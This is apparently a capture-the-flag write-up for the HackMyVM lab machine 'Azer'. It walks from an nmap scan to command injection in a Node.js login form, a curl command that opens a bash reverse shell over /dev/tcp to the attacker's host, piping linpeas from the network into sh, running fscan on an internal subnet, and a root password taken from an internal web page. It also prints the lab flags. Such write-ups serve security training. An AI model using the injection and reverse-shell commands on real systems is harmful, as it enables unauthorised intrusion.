# Azea

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.112:80
Open 10.0.2.112:3000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.112
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-favicon: Unknown favicon MD5: 669C744212A3D236CB8FEBE231CB5451
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: L&#214;SEV | L&#246;semili &#199;ocuklar Vakf\xC4\xB1
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
3000/tcp open  http    syn-ack Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login Page
```
:::

## HTTP (80)

I think the website is just a mirror of legitimate website `losev.org.tr`

![writeup.png](/assets/pentest/hackmyvm/azer/writeup.png)

## HTTP (3000)

Simple login page

![writeup-1.png](/assets/pentest/hackmyvm/azer/writeup-1.png)

First I tried common SQLi payload, but something unusual happened instead

![writeup-2.png](/assets/pentest/hackmyvm/azer/writeup-2.png)

### Reverse Shell

```bash
└─$ curl 'http://10.0.2.112:3000/login' -d 'username=x' --data-urlencode 'password=X; /bin/bash -c "/bin/bash -i >&/dev/tcp/10.0.2.15/4444 0>&1"'
---
└─$ penelope -p 4444
azer@azer:~$ id
uid=1000(azer) gid=1000(azer) groups=1000(azer),100(users)
```

We are user account and not service account so we can upgrade to SSH, however the service is not running!

### User.txt

```bash
azer@azer:~$ cat user.txt
0d2856d69dc348b3af80a0eed67c7502
```

## Privilege Escalation

Something funky is going inside bash history
```bash
azer@azer:~$ cat .bash_history
 mFeZ=CgMb YvPd=UJZx; echo $mFeZ$YvPd
 nmVVcckJVs=FpxQKHbVJN WPuXCgikcB=nkEeZDnJsu;printf $nmVVcckJVs$WPuXCgikcB;echo $$;printf $WPuXCgikcB$nmVVcckJVs
 plfoNlDIOr=lhuRgeoHcH FcyjnGZJec=TlNHMsLykx;printf $plfoNlDIOr$FcyjnGZJec;echo "$(id -un)($(id -u))";printf $FcyjnGZJec$plfoNlDIOr
 DqEvEfKOrA=YyiehIyXCM XMTyFCbmTL=TVQgOtJrJv;printf $DqEvEfKOrA$XMTyFCbmTL;tty;printf $XMTyFCbmTL$DqEvEfKOrA
 xCsVzcHGef=BcVslQQLWt nRViVDSodz=JZYStfudzf;printf $xCsVzcHGef$nRViVDSodz;for i in sh bash python python3 uname script socat tty echo base64 wget curl tar rm stty setsid find nc; do which $i 2>/dev/null || echo;done;printf $nRViVDSodz$xCsVzcHGef
 krcsqBPPAN=pbXcbnloUo AEvWWCenOP=dgJgJjJtjQ;printf $krcsqBPPAN$AEvWWCenOP;for bin in python socat; do for dir in /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin /snap/bin; do _bin=$dir/$bin; test -f $_bin && break || unset _bin; done; echo $_bin; done;printf $AEvWWCenOP$krcsqBPPAN
 SszdOOjRKu=sYywsTjgba aSpOAtXjgW=fShFXinjiN;printf $SszdOOjRKu$aSpOAtXjgW;printf "$(/usr/bin/uname -n)\t$(/usr/bin/uname -s)\t$(/usr/bin/uname -m 2>/dev/null|grep -v unknown||/usr/bin/uname -p 2>/dev/null)";printf $aSpOAtXjgW$SszdOOjRKu
 cZCQqnrCTe=vOEQClpYVM ztBssTdSGb=lAPOYZJLmr;printf $cZCQqnrCTe$ztBssTdSGb;/usr/bin/python3 -V 2>&1 || /usr/bin/python3 --version 2>&1;printf $ztBssTdSGb$cZCQqnrCTe
 exec /usr/bin/bash
```

After formatting it with [https://www.codeclean.net/tools/bash](https://www.codeclean.net/tools/bash) the commands seems to be obfuscated system enumeration tool, nothing for privilege escalation.

There are lots of interfaces and SSH directory has `known_hosts`, if there's no ssh running on this machine then it means it's used to connect to other machines.
```bash
azer@azer:/$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
...
╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)
-rw-r--r-- 1 azer azer 614 Feb 21  2024 /home/azer/.ssh/known_hosts
|1|BAwXZJyy5wWQUXn73FM+nTNxTU0=|QpDNS+7FWuEIiarDnmIaP8s3zQY= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDB73HU4znLRhFHMYLxvn5GDDmCIcHnX83zjfJLhSg4kU3p/+F7+7mtvg7drS8KSLzaIvkrn01Wniaf/RDE3jP1IN3A4GRCAuS0mzkmZwLDNZrx/XOdxZUP5MxxiZEtkVbscvM9prJPafUoJJq4jrSdkhecA+96jW2cI7AOMwqhiOjmUzIMc2sdj3iKXQWyAG5m/IVJiM/pKLGX+EMIylxZY73CI3wSMcxTJDJrURs7xhFwLnaOamJIFBVTivqdP0A+1uJvaS9+hDcc+MqwaStyGyfTNdX3H6rANoCfwuBUbwDTQJ9Fmsha/H3/q+ocj4Xe6+Jm6Dr34Qd7LOJlS3ABDucfdFZ6bp3BZYS9udkhm5j2S/4pm+To1/gaU2wsAVtVuf4uQZABPd7ftFQiwrwNX00kBvTKLMuTBnvLkTRgEc28YPC9mdtkic1ENqoh5kOO2b044HMa/NP74jIBjpplfAzIzMVA6E/AaDPz1vMwWhm5QeN666+oRg2V+dEhpOs=
```

```bash
azer@azer:~$ ip -4 -brief address show
lo               UNKNOWN        127.0.0.1/8
enp0s3           UP             10.0.2.112/24
br-333bcb432cd5  UP             10.10.10.1/24
docker0          DOWN           172.17.0.1/16
```

Discover hosts on second interface.
```bash
azer@azer:~$ curl -LOs https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
azer@azer:~$ chmod +x fscan
azer@azer:~$ ./fscan -h 10.10.10.1/24 -no -nobr -nopoc -np
10.10.10.1:80 open
10.10.10.10:80 open

azer@azer:~$ curl 10.10.10.10
.:.AzerBulbul.:.
```

::: info Creds
`root:.:.AzerBulbul.:.`
:::

```bash
azer@azer:~$ su
Password: .:.AzerBulbul.:.
root@azer:/home/azer# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@azer:/home/azer# cat /root/root.txt
b5d96aec2d5f1541c5e7910ccab527d8
```